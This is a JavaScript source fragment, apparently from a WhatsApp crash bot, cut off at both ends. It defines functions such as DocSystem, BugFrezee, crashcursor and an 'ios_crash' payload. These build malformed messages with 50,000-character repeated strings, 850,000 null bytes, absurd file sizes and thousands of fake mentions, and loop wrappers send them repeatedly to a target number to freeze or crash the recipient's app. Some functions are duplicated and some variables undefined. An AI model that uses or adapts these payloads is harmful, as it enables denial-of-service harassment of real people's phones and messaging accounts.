          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await zephy.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}
    

async function DorVipIP1(target) {
for (let i = 0; i < 5; i++) {
await NIP1(target);
await NIP2(target);
await NIP3(target);
await NIP4(target);
}
console.log(chalk.red.bold(`SENDER DORVIPIP1 TO ${target}`))
};

async function DorVip1(target) {
for (let i = 0; i < 10; i++) {
await NVIP1(target);
await NVIP1(target);
await NVIP2(target);
await NVIP2(target);
await NVIP3(target);
await NVIP3(target);
await NVIP4(target);
await NVIP4(target);
await NVIP5(target);
await NVIP5(target);
}
console.log(chalk.red.bold(`SENDER DORVIP1 TO ${target}`))
};

async function DorVip3(target) {
for (let i = 0; i < 15; i++) {
await NVIP6(target);
await NVIP6(target);
await NVIP7(target);
await NVIP7(target);
await NVIP8(target);
await NVIP8(target);
await NVIP9(target);
await NVIP9(target);
}
console.log(chalk.red.bold(`SENDER DORVIP3 TO ${target}`))
};

async function DorVip2(target) {
for (let i = 0; i < 5; i++) {
await N1(target);
await N2(target);
await N3(target);
await N4(target);
await N5(target);
await N6(target);
await N7(target);
}
console.log(chalk.red.bold(`SENDER DORVIP2 TO ${target}`))
};

async function BugIos(target) {
    for (let i = 0; i < 5; i++) {
        await hardbot(target);
        await tequilav2(target);
        await tequilav2(target);
        await hardbot(target);
    }
    console.log(chalk.red.bold(`SENDER BUGIOS TO ${target}`))
}

async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target);
await DocSystem2(target);
await DocSystem3(target);
await BugFrezee(target);
await EncryptMessage(target);
await FrezeeMsg1(target);
await FrezeeMsg2(target);
}
console.log(chalk.red.bold(`SENDER COMBOX TO ${target}`))
}

async function DocSystem(target) {
            let virtex = "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏 𝗖𝗥𝗔𝗦𝗛𝄽⃟⃟⃟🇮🇩";

            zephy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyzoXSENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function DocSystem2(target) {
            zephy.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "bad ⚔️" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "AVILIABLEBYBara",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "bad@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
        async function DocSystem3(target) {
            zephy.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "XHIROXD",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "BaraXS",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "bad@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
async function BugFrezee(target) {
            zephy.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏🤓" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽𝗫𝘃𝗢 𝗢𝘂𝘁𝄽⃟⃟⃟🇮🇩",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
        async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await zephy.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

        async function DocSystem(target) {
            let virtex = "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏 𝗖𝗥𝗔𝗦𝗛𝄽⃟⃟⃟🇮🇩";

            zephy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyzoXSENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐊𝐔𝐑𝐀𝐌𝐀 𝐕𝟏⿻ 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩⿻";
            let memekz = Date.now();

            await zephy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ $$$𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyziEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function yoiAi(query) {
  return new Promise(async (resolve, reject) => {
    axios.get('https://api.yanzbotz.live/api/ai/labs-perplexity', {
      params: {
        query: query,
        model: 'llama-3.1-sonar-large-128k-online'
      }
    })
    .then(response => {
      resolve(response.data);
    })
    .catch(error => {
      reject(error);
    });
  });
};
        

async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ $$$𝄽⃟⃟⃟🇳🇬🇳🇬⿻";

            zephy.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ $$$𝄽⃟⃟⃟🇳🇬🇳🇬⿻" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }

async function crashhcursor(target, ptcp = true) {
    const stanza = [{
            attrs: {
                biz_bot: '1'
            },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];

    let messagePayload = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Bruh your stupid" + "@0".repeat(50000),
                    listType: 2,
                    singleSelectReply: {
                        selectedRowId: "🩸"
                    },
                    contextInfo: {
                        stanzaId: zephy.generateMessageTag(),
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        mentionedJid: [target, "0@s.whatsapp.net"],
                        quotedMessage: {
                            buttonsMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                    fileLength: "9999999999999",
                                    pageCount: 3567587327,
                                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                    fileName: "#ZephyrineTrashDex",
                                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1735456100",
                                    contactVcard: true,
                                    caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                                },
                                contentText: "- Kami Yo \"👋\"",
                                footerText: "© #trashdexx",
                                buttons: [{
                                    buttonId: "\u0000".repeat(850000),
                                    buttonText: {
                                        displayText: "#trashdexx"
                                    },
                                    type: 1
                                }],
                                headerType: 3
                            }
                        },
                        conversionSource: "porn",
                        conversionData: crypto.randomBytes(16),
                        conversionDelaySeconds: 9999,
                        forwardingScore: 999999,
                        isForwarded: true,
                        quotedAd: {
                            advertiserName: " x ",
                            mediaType: "IMAGE",
                            jpegThumbnail: tdxlol,
                            caption: " x "
                        },
                        placeholderKey: {
                            remoteJid: "0@s.whatsapp.net",
                            fromMe: false,
                            id: "ABCDEF1234567890"
                        },
                        expiration: -99999,
                        ephemeralSettingTimestamp: Date.now(),
                        ephemeralSharedSecret: crypto.randomBytes(16),
                        entryPointConversionSource: "kontols",
                        entryPointConversionApp: "kontols",
                        actionLink: {
                            url: "https://t.me/alantequirasgtps",
                            buttonTitle: "konstol"
                        },
                        disappearingMode: {
                            initiator: 1,
                            trigger: 2,
                            initiatorDeviceJid: target,
                            initiatedByMe: true
                        },
                        groupSubject: "kontol",
                        parentGroupJid: "kontolll",
                        trustBannerType: "kontol",
                        trustBannerAction: 99999,
                        isSampled: true,
                        externalAdReply: {
                            title: "! Zhee! - \"𝗋34\" 🩸",
                            mediaType: 2,
                            renderLargerThumbnail: false,
                            showAdAttribution: false,
                            containsAutoReply: false,
                            body: "© running since 2020 to 20##?",
                            thumbnail: tdxlol,
                            sourceUrl: "go fuck yourself",
                            sourceId: "dvx - problem",
                            ctwaClid: "cta",
                            ref: "ref",
                            clickToWhatsappCall: true,
                            automatedGreetingMessageShown: false,
                            greetingMessageBody: "kontol",
                            ctaPayload: "cta",
                            disableNudge: true,
                            originalImageUrl: "konstol"
                        },
                        featureEligibilities: {
                            cannotBeReactedTo: true,
                            cannotBeRanked: true,
                            canRequestFeedback: true
                        },
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "120363274419384848@newsletter",
                            serverMessageId: 1,
                            newsletterName: `- # Xzcrash Ni Memek   - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                            contentType: 3,
                            accessibilityText: "kontol"
                        },
                        statusAttributionType: 2,
                        utm: {
                            utmSource: "utm",
                            utmCampaign: "utm2"
                        }
                    },
                    description: "by : # Xzhee Crasher"
                },
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16),
                    }),
                },
            }
        }
    }

    await zephy.relayMessage(target, messagePayload, {
        additionalNodes: stanza,
        participant: {
            jid: target
        }
    });
}

// Fungsi untuk menghapus semua pesan dari target
async function clearChat(target) {
    try {
        // Format nomor ke format JID
        const targetJid = targetNumber.includes("@s.whatsapp.net") ?
            targetNumber :
            `${target}@s.whatsapp.net`;

        // Periksa apakah target ada di daftar kontak
        const chats = zephy.chats.get(targetJid);
        if (!chats) {
            console.log("Target chat tidak ditemukan!");
            return;
        }

        // Hapus semua pesan di chat target
        await zephy.modifyChat(targetJid, "delete");
        console.log(`Semua pesan dengan ${target} telah dihapus.`);
    } catch (error) {
        console.error("Gagal menghapus chat:", error);
    }
}
async function hardbot(target) {
    try {
        let msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    videoMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/21986779_1020055262365482_1348589645035994498_n.enc?ccb=11-4&oh=01_AdSiWbT4afeKnpYPqW3q6e9Zyk_kW-Xx8XZ6tin_tWV6oQ&oe=65AE7EC6&_nc_sid=5aebc0",
                        mimetype: "video/mp4",
                        fileSha256: "OXsqrJBQbWxzuZyeejkrzxwJGnx1KKsKtwX6HmNNopg=",
                        fileLength: "7595456",
                        seconds: 24,
                        mediaKey: "ly3ML0V/wxmLPoQ0FFGJoS+nOtRPQJwPCZP4n6pUVyE=",
                        height: 1024,
                        width: 576,
                        fileEncSha256: "WMgxGPybPS1TbS0UZ4mErxOY5GxL5pUij8ihXnzQBMw=",
                        directPath: "/v/t62.7161-24/21986779_1020055262365482_1348589645035994498_n.enc?ccb=11-4&oh=01_AdSiWbT4afeKnpYPqW3q6e9Zyk_kW-Xx8XZ6tin_tWV6oQ&oe=65AE7EC6&_nc_sid=5aebc0",
                        mediaKeyTimestamp: "1705666666",
                        jpegThumbnail: tdxlol,
                        viewOnce: true
                    }
                }
            }
        });
        await zephy.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
    } catch (error) {
        console.log(error);
    }
}

// Fungsi tequilav2
async function tequilav2(target) {
    try {
        let msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            jpegThumbnail: tdxlol,
                            titleText: "Crash" + "͏".repeat(25999),
                        },
                        nativeFlowMessage: {
                            buttons: [{
                                    name: "ios_crash",
                                    buttonParamsJson: "͏".repeat(25999),
                                },
                                {
                                    name: "ios_crash2",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        });
        await zephy.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
    } catch (error) {
        console.log(error);
    }
}
async function invc2(nomor) {
    let target = nomor
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Xzcrash No Lawan ۞",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "𝗨𝗻𝗱𝗲𝗿𝗰𝗿𝗮𝘀𝗵"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "z"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await zephy.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: {
            jid: target
        }
    });
}
async function crashcursor(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: ";🩸⃟⃨〫⃰‣ ⁖ 𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐊𝐢𝐥𝐥𝐞𝐫‣—" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: conn.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🩸⃟⃨〫⃰‣ ⁖𝐕𝐚𝐦𝐩𝐢𝐫𝐞𝐊𝐢𝐥𝐥𝐞𝐫 ‣—",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𐎟 𝐕𝐚𝐦𝐩𝐢𝐫𝐞 ⿻ 𝐂͢𝐋𝐢𝚵͢𝐍𝐓͢ 𐎟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! 𝖽𝖾𝗏𝗈𝗋𝗌𝖾𝗅𝗌 - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : devorsixcore"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await zephy.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
async function overloadButton(Target, ptcp = true) {
let sections = [];
